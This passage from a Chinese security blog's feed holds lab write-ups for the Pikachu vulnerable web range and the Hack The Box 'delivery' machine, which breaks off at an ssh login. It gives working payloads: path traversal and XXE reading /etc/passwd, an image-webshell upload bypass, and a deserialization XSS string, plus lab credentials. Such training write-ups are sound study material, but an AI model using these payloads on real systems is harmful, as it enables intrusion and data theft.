class="line">但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，</span><br><span class="line">这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 </span><br><span class="line">攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 </span><br><span class="line">根据不同的配置环境，</span><br><span class="line">文件包含漏洞分为如下两种情况：</span><br><span class="line">1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，</span><br><span class="line">由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，</span><br><span class="line">攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。</span><br><span class="line">很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。</span><br><span class="line">2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，</span><br><span class="line">这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</span><br><span class="line">因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，</span><br><span class="line">如果非要这么做，也一定要做严格的白名单策略进行过滤。</span><br></pre></td></tr></table></figure><h3 id="01-本地文件包含"><a href="#01-本地文件包含" class="headerlink" title="01.本地文件包含"></a>01.本地文件包含</h3><img src="/2021/04/28/Pikachu/image-20210427153823309.png" class><h3 id="02-远程文件包含"><a href="#02-远程文件包含" class="headerlink" title="02.远程文件包含"></a>02.远程文件包含</h3><p><code>nothing</code></p><h2 id="0x07-不安全的文件下载"><a href="#0x07-不安全的文件下载" class="headerlink" title="0x07.不安全的文件下载"></a>0x07.不安全的文件下载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不安全的文件下载概述文件下载功能在很多web系统上都会出现，</span><br><span class="line">一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，</span><br><span class="line">后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 </span><br><span class="line">如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，</span><br><span class="line">则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，</span><br><span class="line">而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 </span><br><span class="line">从而导致后台敏感信息(密码文件、源代码等)被下载。所以，在设计文件下载功能时，</span><br><span class="line">如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 </span><br><span class="line">切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427170920823.png" class><h2 id="0x08-不安全的文件上传"><a href="#0x08-不安全的文件上传" class="headerlink" title="0x08.不安全的文件上传"></a>0x08.不安全的文件上传</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不安全的文件上传漏洞概述文件上传功能在web应用系统很常见，</span><br><span class="line">比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，</span><br><span class="line">后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，</span><br><span class="line">然后将其按照设计的格式进行重命名后存储在指定的目录。 </span><br><span class="line">如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，</span><br><span class="line">则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</span><br><span class="line">所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。</span><br><span class="line">比如：--验证文件类型、后缀名、大小;--验证文件的上传方式;</span><br><span class="line">--对文件进行一定复杂的重命名;--不要暴露文件上传后的路径;--等等...</span><br></pre></td></tr></table></figure><h3 id="01-client-check"><a href="#01-client-check" class="headerlink" title="01.client check"></a>01.client check</h3><p><code>抓包改名即可</code></p><img src="/2021/04/28/Pikachu/image-20210427172209197.png" class><p><code>蚁剑连接</code></p><img src="/2021/04/28/Pikachu/image-20210427172237838.png" class><h3 id="02-MIME-type"><a href="#02-MIME-type" class="headerlink" title="02.MIME type"></a>02.MIME type</h3><p><code>抓包修改文件类型即可</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">常见的MIME类型超文本标记语言文本</span><br><span class="line">.html,.html text/html普通文本 </span><br><span class="line">.txt text/plainRTF文本 </span><br><span class="line">.rtf application/rtfGIF图形 </span><br><span class="line">.gif image/gifJPEG图形 </span><br><span class="line">.ipeg,.jpg image/jpegau声音文件 </span><br><span class="line">.au audio/basicMIDI音乐文件 </span><br><span class="line">.mid,.midi audio/midi,audio/x-midiRealAudio音乐文件 </span><br><span class="line">.ra, .ram audio/x-pn-realaudioMPEG文件 </span><br><span class="line">.mpg,.mpeg video/mpegAVI文件 </span><br><span class="line">.avi video/x-msvideoGZIP文件 </span><br><span class="line">.gz application/x-gzipTAR文件 </span><br><span class="line">.tar application/x-tar</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427172741958.png" class><h3 id="03-getimagesize"><a href="#03-getimagesize" class="headerlink" title="03.getimagesize"></a>03.getimagesize</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个函数功能会对目标文件的16进制去进行一个读取，</span><br><span class="line">去读取头几个字符串是不是符合图片的要求的,</span><br><span class="line">所以不能通过修改content-type来达到目的，</span><br><span class="line">需要将一句话放入一张真正的图片    copy shell.jpg/b + shell.php/b shell.jpg</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210427205034653.png" class><p><code>包含这个图片马，再用蚁剑连接</code></p><h2 id="0x09-越权"><a href="#0x09-越权" class="headerlink" title="0x09.越权"></a>0x09.越权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，</span><br><span class="line">如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。</span><br><span class="line">一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，</span><br><span class="line">当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，</span><br><span class="line">看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</span><br><span class="line">因此，在在权限管理中应该遵守：</span><br><span class="line">1.使用最小权限原则对用户进行赋权;</span><br><span class="line">2.使用合理（严格）的权限校验规则;</span><br><span class="line">3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件。</span><br></pre></td></tr></table></figure><h3 id="01-水平越权"><a href="#01-水平越权" class="headerlink" title="01.水平越权"></a>01.水平越权</h3><p><code>修改username值可以发现可以查看任意用户信息</code></p><h3 id="02-垂直越权"><a href="#02-垂直越权" class="headerlink" title="02.垂直越权"></a>02.垂直越权</h3><p><code>使用pikachu登入访问vul/overpermission/op2/op2_admin_edit.php</code></p><img src="/2021/04/28/Pikachu/image-20210427212129726.png" class><h2 id="0x10-目录遍历"><a href="#0x10-目录遍历" class="headerlink" title="0x10.目录遍历"></a>0x10.目录遍历</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">目录遍历漏洞概述</span><br><span class="line">在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，</span><br><span class="line">从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，</span><br><span class="line">便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 </span><br><span class="line">在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，</span><br><span class="line">则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 </span><br><span class="line">从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</span><br><span class="line">看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，</span><br><span class="line">甚至文件包含漏洞有差不多的意思，</span><br><span class="line">是的，目录遍历漏洞形成的最主要的原因跟这两者一样，</span><br><span class="line">都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，</span><br><span class="line">而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，</span><br><span class="line">因此，这里还是单独拿出来定义一下。</span><br><span class="line">需要区分一下的是,</span><br><span class="line">如果你通过不带参数的url（比如：http://xxxx/doc）列出了doc文件夹里面所有的文件，</span><br><span class="line">这种情况，我们成为敏感信息泄露。 </span><br><span class="line">而并不归为目录遍历漏洞。</span><br></pre></td></tr></table></figure><blockquote><p>?title=../../../../../../../etc/passwd</p></blockquote><img src="/2021/04/28/Pikachu/image-20210427212801523.png" class><h2 id="0x11-敏感信息泄露"><a href="#0x11-敏感信息泄露" class="headerlink" title="0x11.敏感信息泄露"></a>0x11.敏感信息泄露</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">敏感信息泄露概述</span><br><span class="line">由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 </span><br><span class="line">比如：</span><br><span class="line">---通过访问url下的目录，可以直接列出目录下的文件列表;</span><br><span class="line">---输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;</span><br><span class="line">---前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</span><br><span class="line">类似以上这些情况，我们成为敏感信息泄露。</span><br><span class="line">敏感信息泄露虽然一直被评为危害比较低的漏洞，</span><br><span class="line">但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,</span><br><span class="line">甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 </span><br><span class="line">因此,在web应用的开发上，除了要进行安全的代码编写，</span><br><span class="line">也需要注意对敏感信息的合理处理。</span><br></pre></td></tr></table></figure><p><code>查看源码发现用户 lili/123456</code></p><h2 id="0x12-PHP反序列化"><a href="#0x12-PHP反序列化" class="headerlink" title="0x12.PHP反序列化"></a>0x12.PHP反序列化</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</span><br><span class="line"></span><br><span class="line">序列化serialize()</span><br><span class="line">序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</span><br><span class="line">    class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    serialize($s); //把这个对象进行序列化</span><br><span class="line">    序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">        O:代表object</span><br><span class="line">        1:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        1:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        4:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        7:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br><span class="line">    </span><br><span class="line">反序列化unserialize()</span><br><span class="line">就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</span><br><span class="line"></span><br><span class="line">    $u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">    echo $u-&gt;test; //得到的结果为pikachu</span><br><span class="line">    </span><br><span class="line">序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</span><br><span class="line"></span><br><span class="line">        常见的几个魔法函数:</span><br><span class="line">        __construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">        __destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">        __toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">        __sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">        __wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">        漏洞举例:</span><br><span class="line"></span><br><span class="line">        class S&#123;</span><br><span class="line">            var $test = &quot;pikachu&quot;;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                echo $this-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $s = $_GET[&#x27;test&#x27;];</span><br><span class="line">        @$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">        payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x13-XXE"><a href="#0x13-XXE" class="headerlink" title="0x13.XXE"></a>0x13.XXE</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">XXE -&quot;xml external entity injection&quot;</span><br><span class="line">既&quot;xml外部实体注入漏洞&quot;。</span><br><span class="line">概括一下就是</span><br><span class="line">&quot;攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题&quot;</span><br><span class="line">也就是说服务端接收和解析了来自用户端的xml数据,</span><br><span class="line">而又没有做严格的安全控制,从而导致xml外部实体注入。</span><br><span class="line"></span><br><span class="line">具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。</span><br><span class="line">现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。</span><br><span class="line">以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</span><br><span class="line"></span><br><span class="line">本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure><img src="/2021/04/28/Pikachu/image-20210428085543239.png" class><h2 id="0x14-URL重定向"><a href="#0x14-URL重定向" class="headerlink" title="0x14.URL重定向"></a>0x14.URL重定向</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">不安全的url跳转</span><br><span class="line"></span><br><span class="line">不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。</span><br><span class="line">如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话</span><br><span class="line">就可能发生&quot;跳错对象&quot;的问题。</span><br><span class="line"></span><br><span class="line">url跳转比较直接的危害是:</span><br><span class="line"><span class="meta">--&gt;</span><span class="bash">钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</span></span><br></pre></td></tr></table></figure><h2 id="0x15-SSRF"><a href="#0x15-SSRF" class="headerlink" title="0x15.SSRF"></a>0x15.SSRF</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造)</span><br><span class="line">其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</span><br><span class="line"></span><br><span class="line">导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</span><br><span class="line"></span><br><span class="line">数据流:攻击者-----&gt;服务器----&gt;目标地址</span><br><span class="line"></span><br><span class="line">根据后台使用的函数的不同,对应的影响和利用方法又有不一样</span><br><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br><span class="line">            </span><br><span class="line">如果一定要通过后台服务器远程去对用户指定(&quot;或者预埋在前端的请求&quot;)的地址进行资源请求,则请做好目标地址的过滤。</span><br></pre></td></tr></table></figure><h3 id="01-SSRF-curl"><a href="#01-SSRF-curl" class="headerlink" title="01.SSRF(curl)"></a>01.SSRF(curl)</h3><p><code>可以测开放的端口</code></p><img src="/2021/04/28/Pikachu/image-20210428091315523.png" class><h3 id="02-SSRF-file-get-content"><a href="#02-SSRF-file-get-content" class="headerlink" title="02.SSRF(file_get_content)"></a>02.SSRF(file_get_content)</h3><img src="/2021/04/28/Pikachu/image-20210428141007433.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-暴力破解&quot;&gt;&lt;a href=&quot;#0x01-暴力破解&quot; class=&quot;headerlink&quot; title=&quot;0x01.暴力破解&quot;&gt;&lt;/a&gt;0x01.暴力破解&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Burte Force（暴力破解）概述&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;“暴力破解”是一攻击手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这里的认证安全策略, 包括：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1.是否要求用户设置复杂的密码；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4.是否采用了双因素认证；&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Web靶场" scheme="https://lunamoore.github.io/categories/Web%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[delivery]</title>
    <link href="https://lunamoore.github.io/2021/02/04/HTB-delivery/"/>
    <id>https://lunamoore.github.io/2021/02/04/HTB-delivery/</id>
    <published>2021-02-04T03:12:17.000Z</published>
    <updated>2021-02-04T03:18:20.850Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/02/04/HTB-delivery/image-20210203224703300.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>只开放了22与80端口</code></p><blockquote><p>添加两条hosts文件</p><p>10.10.10.222    helpdesk.delivery.htb<br>10.10.10.222    delivery.htb</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/delivery# nmap -sC -sV -sT 10.10.10.222 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-03 16:27 EST</span><br><span class="line">Nmap scan report for helpdesk.delivery.htb (10.10.10.222)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 965 closed ports, 33 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)</span><br><span class="line">|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)</span><br><span class="line">|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: delivery</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 100.17 seconds</span><br><span class="line">root@JIYE:~/htb/delivery#</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>发现于邮件相关</code></p><img src="/2021/02/04/HTB-delivery/image-20210203225046353.png" class><p><code>手动爬虫发现两个有用链接如下</code></p><blockquote><p>第一个为一个计票系统</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225320648.png" class><blockquote><p>第二个为提供MatterMost服务</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225437119.png" class><blockquote><p>点击MatterMost server跳转到如下页面，可以登入注册</p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203225641859.png" class><h2 id="0x03-提交表单进行测试"><a href="#0x03-提交表单进行测试" class="headerlink" title="0x03.提交表单进行测试"></a>0x03.提交表单进行测试</h2><p><code>提交</code></p><img src="/2021/02/04/HTB-delivery/image-20210203225931140.png" class><p><code>得到ticket id 6285564与邮箱6285564@delivery.htb</code></p><img src="/2021/02/04/HTB-delivery/image-20210203230847316.png" class><p><code>提交完成之后可以进行状态查询</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231322565.png" class><p><code>可以看到状态如下</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231357635.png" class><h2 id="0x04-邮箱利用MasterMost"><a href="#0x04-邮箱利用MasterMost" class="headerlink" title="0x04.邮箱利用MasterMost"></a>0x04.邮箱利用MasterMost</h2><p><code>使用6285564@delivery.htb注册MasterMost</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231611322.png" class><p><code>再次查看状态，可以看到刚刚的邮件激活连接</code></p><img src="/2021/02/04/HTB-delivery/image-20210203231908206.png" class><h2 id="0x05-激活登入"><a href="#0x05-激活登入" class="headerlink" title="0x05.激活登入"></a>0x05.激活登入</h2><p><code>点击如下连接</code></p><blockquote><p><span class="exturl" data-url="aHR0cDovL2RlbGl2ZXJ5Lmh0Yjo4MDY1L2RvX3ZlcmlmeV9lbWFpbD90b2tlbj1qb3JwMWtrZnJxaGtneDl3b3FhM3o5ZGszM2h3aHhyaGhvem9uMXNzdW10dGplcHA2bW1iOHE5OWF5aXQ4aWRxJmFtcDtlbWFpbD02Mjg1NTY0QGRlbGl2ZXJ5Lmh0Yg==">http://delivery.htb:8065/do_verify_email?token=jorp1kkfrqhkgx9woqa3z9dk33hwhxrhhozon1ssumttjepp6mmb8q99ayit8idq&amp;email=6285564%40delivery.htb<i class="fa fa-external-link-alt"></i></span></p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203232040991.png" class><p><code>加入团队</code></p><img src="/2021/02/04/HTB-delivery/image-20210203232228472.png" class><p><code>得到用户名与密码</code></p><blockquote><p>maildeliverer:Youve_G0t_Mail! </p></blockquote><img src="/2021/02/04/HTB-delivery/image-20210203232549365.png" class><p><code>登入得到flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# ssh 